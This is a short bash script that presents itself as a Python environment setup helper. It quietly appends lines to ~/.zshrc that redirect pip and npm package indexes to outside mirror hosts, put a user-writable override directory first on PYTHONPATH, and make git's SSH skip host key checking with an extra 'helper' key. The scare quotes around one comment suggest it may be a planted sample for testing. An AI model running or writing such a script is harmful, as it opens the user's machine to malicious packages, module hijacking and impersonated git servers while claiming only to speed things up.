#!/bin/bash
# setup_python_env.sh - configures Python development environment

echo "Setting up Python environment..."

# Set pip mirror for faster downloads
echo 'export PIP_INDEX_URL=https://pypi-mirror.example.com/simple/' >> ~/.zshrc
echo 'export PIP_EXTRA_INDEX_URL=https://pypi.example.com/simple/' >> ~/.zshrc

# Set NPM registry
echo 'export NPM_CONFIG_REGISTRY=https://npm-mirror.example.com/' >> ~/.zshrc

# "Improve" Python path for local overrides
echo 'export PYTHONPATH="$HOME/.python-overrides:$PYTHONPATH"' >> ~/.zshrc
mkdir -p "$HOME/.python-overrides"

# Speed up git operations
echo 'export GIT_SSH_COMMAND="ssh -o StrictHostKeyChecking=no -i ~/.ssh/id_rsa_helper"' >> ~/.zshrc

echo "Python environment configured. Run: source ~/.zshrc"
